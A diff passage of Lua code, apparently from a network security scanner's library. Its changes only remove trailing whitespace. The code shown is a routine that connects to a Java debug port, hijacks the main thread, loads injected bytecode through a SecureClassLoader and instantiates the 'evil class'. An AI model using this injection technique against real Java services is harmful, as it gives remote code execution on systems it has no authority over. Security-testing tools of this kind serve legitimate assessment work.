 	-- in order to load a new class file, thread must be suspended by an event
 	-- so we set it to singlestep, let it run and it get suspended right away
-	local threads 
+	local threads
 	status,threads = getAllThreads(socket,0)
 	if not status then
 		stdnse.print_debug("get threads failed: %s", threads)
@@ -1003,7 +1003,7 @@ function injectClass(socket,class_bytes)
 	end
 	local main_thread
 	local eventID
-	stdnse.print_debug("Looking for main thread...")		
+	stdnse.print_debug("Looking for main thread...")
 	for _,thread in ipairs(threads) do
 		local thread_name
 		status, thread_name = getThreadName(socket,0,thread)
@@ -1012,7 +1012,7 @@ function injectClass(socket,class_bytes)
 			return false
 		end
 		if thread_name == "main" then
-			stdnse.print_debug("Setting singlesteping to main thread.")		
+			stdnse.print_debug("Setting singlesteping to main thread.")
 			status, eventID = setThreadSinglestep(socket,0,thread)
 			main_thread = thread
 			break
@@ -1023,25 +1023,25 @@ function injectClass(socket,class_bytes)
 		return false
 	end
 	-- to trigger the singlestep event, VM must be resumed
-	stdnse.print_debug("Resuming VM and waiting for single step event from main thread...")		
+	stdnse.print_debug("Resuming VM and waiting for single step event from main thread...")
 	local status, _ = resumeVM(socket,0)
 	-- clear singlestep since we need to run our code in this thread and we don't want it to stop after each instruction
 	clearThreadSinglestep(socket,0,eventID)
-	stdnse.print_debug("Cleared singlesteping from main thread.")			
-	
-	-- instantiate new class loader 
-	local class_loader_instance 
+	stdnse.print_debug("Cleared singlesteping from main thread.")
+
+	-- instantiate new class loader
+	local class_loader_instance
 	status, class_loader_instance = newClassInstance(socket,0,secureClassLoader,main_thread,constructorMethodID,0,nil)
 	if not status then
 		stdnse.print_debug("newClassInstance failed: %s", class_loader_instance)
 		return false
 	end
-	stdnse.print_debug("Created new instance of SecureClassLoader.")		
-	
-	local injectedClass 
+	stdnse.print_debug("Created new instance of SecureClassLoader.")
+
+	local injectedClass
 	-- invoke defineClass with byte array that contains our bytecode
 	local defineClassArgs = bin.pack(">CLCiCi",0x5b,arrayID,0x49,0,0x49,#class_bytes) -- argument tags taken from http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/types.html#wp9502
-	stdnse.print_debug("Calling secureClassLoader.defineClass(byte[],int,int) ...")			
+	stdnse.print_debug("Calling secureClassLoader.defineClass(byte[],int,int) ...")
 	status, injectedClass = invokeObjectMethod(socket,0,class_loader_instance,main_thread,secureClassLoader,defineClassMethodID,3,defineClassArgs)
 	if not status then
 		stdnse.print_debug("invokeObjectMethod failed: %s", injectedClass)
@@ -1053,34 +1053,34 @@ function injectClass(socket,class_bytes)
 	end
 	-- extract the injected class' ID
 	local tag,injectedClassID
-	_,tag,injectedClassID = bin.unpack(">CL",injectedClass)	
+	_,tag,injectedClassID = bin.unpack(">CL",injectedClass)
 
 	-- our class is now injected, but we need to find it's methods by calling Class.getMethods() on it
 	-- and for that we need its runtime_type which is Class
-	local runtime_type 
+	local runtime_type
 	status, runtime_type = getRuntimeType(socket,0,injectedClassID) -- should be Class
-	-- find the getMethods() id	
+	-- find the getMethods() id
 	local getMethodsMethod = findMethod(socket,runtime_type,"getMethods",false)
-	status, _ = invokeObjectMethod(socket,0,injectedClassID,main_thread,runtime_type,getMethodsMethod,0,nil) 
+	status, _ = invokeObjectMethod(socket,0,injectedClassID,main_thread,runtime_type,getMethodsMethod,0,nil)
 
 
-	stdnse.print_debug("New class defined. Injected class id : %d",injectedClassID)		
+	stdnse.print_debug("New class defined. Injected class id : %d",injectedClassID)
 	local sig, reflected_type
 	status, sig = getSignatureWithGeneric(socket,0,injectedClassID)
 	stdnse.print_debug("Injected class signature: %s", sig)
-	status, reflected_type = getReflectedType(socket,0,injectedClassID)	
+	status, reflected_type = getReflectedType(socket,0,injectedClassID)
 
 	-- find injected class constructor
 	local injectedConstructor = findMethod(socket,injectedClassID,"<init>",false)
-	
+
 	if injectedConstructor == nil then
 		stdnse.print_debug("Couldn't find either evil method or constructor")
 		return false
-	end	
-	
-	-- instantiate our evil class 
+	end
+
+	-- instantiate our evil class
 	local injectedClassInstance
-	status, injectedClassInstance = newClassInstance(socket,0,injectedClassID,main_thread,injectedConstructor,0,nil)	
+	status, injectedClassInstance = newClassInstance(socket,0,injectedClassID,main_thread,injectedConstructor,0,nil)
 	if not status then
 		return false, injectedClassInstance
 	end
